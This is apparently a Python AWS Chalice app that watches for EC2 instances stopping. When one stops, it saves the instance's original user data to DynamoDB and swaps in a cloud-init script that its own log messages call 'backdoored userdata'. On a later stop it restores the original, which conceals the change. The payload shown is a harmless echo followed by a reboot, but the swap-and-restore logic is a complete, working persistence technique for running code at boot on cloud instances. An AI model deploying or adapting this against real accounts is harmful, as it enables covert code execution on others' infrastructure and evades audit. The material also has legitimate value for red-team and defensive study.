import base64
from enum import Enum
import time
from typing import TYPE_CHECKING

import boto3
from chalice import Chalice
from typing import TypedDict, List

if TYPE_CHECKING:
    import mypy_boto3_ec2
    import mypy_boto3_dynamodb
    import mypy_boto3_dynamodb.type_defs
    import mypy_boto3_events.type_defs
    import chalice.app

    from mypy_boto3_ec2.type_defs import UserDataTypeDef, BlobAttributeValueTypeDef


DYNAMODB_TABLE = 'UserDataSwap'

InstanceState = TypedDict('InstanceState', {
    'code': int,
    'name': str
})

InstanceSet = TypedDict('InstanceSet', {
    'imageId': str,
    'minCount': int,
    'maxCount': int,
    'keyName': str,
    'instanceId': str,
    'instanceState': InstanceState,
    'privateDnsName': str,
    'amiLaunchIndex': int,
    'productCodes': dict,
    'instanceType': str,
    'launchTime': int,
})

InstancesSet = TypedDict('InstancesSet', {
    'items': List[InstanceSet]
})

RequestParameters = TypedDict('RequestParameters', {
    'userData': str,
    'instancesSet': InstancesSet,
})

ResponseParameters = TypedDict('ResponseParameters', {
  'requestId': str,
  'reservationId': str,
  'ownerId': str,
  'groupSet': dict,
  'instancesSet': InstancesSet,
})

RunInstanceEvent = TypedDict('RunInstanceEvent', {
    'eventVersion': str,
    'userIdentity': dict,
    'eventTime': str,
    'eventName': str,
    'sourceIPAddress': str,
    'userAgent': str,
    'requestParameters': RequestParameters,
    'responseElements': ResponseParameters,
    'requestID': str,
    'eventID': str,
    'readOnly': bool,
    'eventType': str,
    'managementEvent': bool,
    'recipientAccountId': str,
    'eventCategory': str
})


class InstanceState(Enum):
     RUNNING = "running"
     STOPPED = "stopped"


InstanceChangeNotification = TypedDict( 'InstanceChangeNotification', {
    "instance-id": str,
    "state": InstanceState,
})

app = Chalice(app_name='user-data-swap')

sess = boto3.Session()
ec2 = sess.resource('ec2')


def swap_user_data(inst: 'mypy_boto3_ec2.ServiceResource.Instance', user_data: str, force: bool = True):
    print("current state: " + str(inst.state['Name']))
    inst.stop(Force=force)

    print("waiting for stopped state")
    wait_for(inst, "stopped")

    print("modifing user data")
    inst.modify_attribute(UserData={"Value": user_data.encode()})

    print("starting")
    inst.start()

# @app.on_cw_event({
#   "source": ["aws.ec2"],
#   "detail-type": ["EC2 Instance State-change Notification"],
#   "detail": {
#     "state": ["pending", "running", "stopped"]
#   }
# })
# def main(event: 'chalice.app.CloudWatchEvent'):

# @app.on_cw_event({
#   "source": ["aws.ec2"],
#   "detail": {
#     "eventSource": ["ec2.amazonaws.com"],
#     "eventName": ["RunInstances"]
#   }
# })
# def main(event: 'chalice.app.CloudWatchEvent'):
#     event.detail: 'RunInstanceEvent'
#     orig_user_data = event.detail['requestParameters'].get('userData', '')
#     print("original user data: " + orig_user_data)
#
#     for instance in event.detail['responseElements']['instancesSet']['items']:
#         inst = ec2.Instance(instance['instanceId'])
#         swap_user_data(inst, '''\
# #cloud-config
#
# bootcmd:
#  - echo HELLO FROM USER DATA SCRIPT | tee /msg > /dev/kmsg
#  - cloud-init clean && reboot
# ''')
#
#         # Shutdown is handled in the bootcmd, this makes sure we don't modify the userData back to the original
#         # before our userData runs. We can't simply wait for a running state because the cloud-init data may have not
#         # run at that point.
#         print('waiting for pending state')
#         wait_for(inst, "pending")
#
#         print('waiting for stopped state')
#         wait_for(inst, "stopped")
#
#         print('restoring user data')
#         swap_user_data(inst, user_data=orig_user_data)
#         print('done')
#
#     return {'status': "done"}
#

USER_DATA = '''\
#cloud-config

bootcmd:
 - echo HELLO FROM USER DATA SCRIPT | tee /msg > /dev/kmsg
 - cloud-init clean && reboot
'''


# Valid States: ["pending", "running", "shutting-down", "terminated", "stopping", "stopped"]
#
# Event:
#   {
#     "instance-id": "i-01221288b498bc134",
#     "state": "stopped"
#   }
#
@app.on_cw_event({
  "source": ["aws.ec2"],
  "detail-type": ["EC2 Instance State-change Notification"],
  "detail": {
    "state": ["stopped"]
  }
})
def on_stop(event: 'chalice.app.CloudWatchEvent'):
    detail: InstanceChangeNotification = event.detail

    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table(DYNAMODB_TABLE)

    ec2 = boto3.resource('ec2')
    inst = ec2.Instance(detail['instance-id'])

    resp = table.get_item(Key={'instance_id': detail['instance-id']})
    inst_state = None
    if resp.get('Item'):
        inst_state = resp['Item'].get('inst_state')

    if not inst_state:
        print(f"'{inst.id}' (inst_state {inst_state}): setting backdoored userdata")
        orig_userdata = set_userdata(inst, USER_DATA)
        update_item(table, inst.id, 'orig_userdata', orig_userdata)
        update_item(table, inst.id, 'inst_state', 'pending_reset')
        print(f"'{inst.id}' (inst_state {inst_state}): backdoored userdata set, set state to 'pending_reset'")
    elif inst_state == 'pending_reset':
        print(f"'{inst.id}' (state {inst_state}): reverting to original user data")
        orig_userdata = get_item(table, inst.id, 'orig_userdata')
        set_userdata(inst, orig_userdata)
        print(f"'{inst.id}' (inst_state {inst_state}): reverted to original user data")
        print(f"'{inst.id}' (inst_state {inst_state}): starting")
        update_item(table, inst.id, 'inst_state', 'completed')
        print(f"'{inst.id}' (inst_state {inst_state}): starting, set inst_state to 'completed'")
    elif inst_state == 'completed':
        print(f"'{inst.id}' (inst_state {inst_state}): skipping due to state == 'completed'")
    else:
        raise UserWarning(f"{inst.id} in unknown inst_state: {inst_state}")


def update_item(table: 'mypy_boto3_dynamodb.ServiceResource.Table', inst_id: str, key: str, value: str):
    table.update_item(
        Key={
            'instance_id': inst_id,
        },
        UpdateExpression=f"set {key}=:v",
        ExpressionAttributeValues={
            ':v': value,
        },
    )


def get_item(table: 'mypy_boto3_dynamodb.ServiceResource.Table', inst_id, key):
    resp: 'mypy_boto3_dynamodb.type_defs.GetItemOutputTypeDef' = table.get_item(
        Key={
            'instance_id': inst_id,
        },
        AttributesToGet=[key],
    )
    return resp['Item'][key]


def set_userdata(inst: 'mypy_boto3_ec2.ServiceResource.Instance', user_data: str) -> str:
    resp = inst.describe_attribute(Attribute="userData")
    orig_userdata = base64.b64decode(resp['UserData'].get('Value', '')).decode()
    inst.modify_attribute(UserData={"Value": user_data.encode()})
    return orig_userdata


def wait_for(inst: 'mypy_boto3_ec2.ServiceResource.Instance', state: str, sleep=2, max_tries=300):
    tries = 0
    inst.reload()
    while inst.state["Name"] != state:
        tries += 1
        if tries >= max_tries:
            raise UserWarning(f'exceeded max tries while waiting for {inst.id} to enter the {state} state')
        inst.reload()
        time.sleep(sleep)
